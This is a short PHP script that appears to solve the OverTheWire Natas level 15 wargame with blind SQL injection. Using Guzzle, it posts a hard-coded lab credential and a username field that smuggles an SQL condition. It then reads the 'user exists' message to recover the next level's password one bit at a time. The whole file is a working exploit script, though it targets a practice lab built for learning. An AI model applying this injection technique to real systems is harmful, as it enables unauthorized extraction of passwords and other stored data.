<?php
use GuzzleHttp\Client;
require 'vendor/autoload.php';
$http = new Client();

/**
 * @param Client $http
 * @param string $suffix
 * @return bool|null
 */
function sqli_oracle(Client $http, $suffix = '1'): ?bool
{
    $request = $http->post(
        'http://natas15.natas.labs.overthewire.org/index.php',
        [
            'auth' => ['natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'],
            'form_params' => [
                'username' => 'natas16" AND ' . $suffix . ' #'
            ]
        ]
    );
    $response = $request->getBody() . '';
    if (strpos($response, 'This user exists.') !== false) {
        return true;
    }
    if (strpos($response, 'This user doesn\'t exist.') !== false) {
        return false;
    }
    var_dump($response);
    return null;
}

$password = "";
for ($i = 0; $i < 33; ++$i) {
    $c = 0;
    for ($j = 0; $j < 8; ++$j) {
        $found = sqli_oracle($http,
            '(ORD(SUBSTRING(password, ' . $i . ', 1)) >> ' . $j .') & 1 = 1'
        );
        if ($found) {
            $c |= 1 << $j;
        }
    }
    $password .= chr($c);
}

var_dump($password);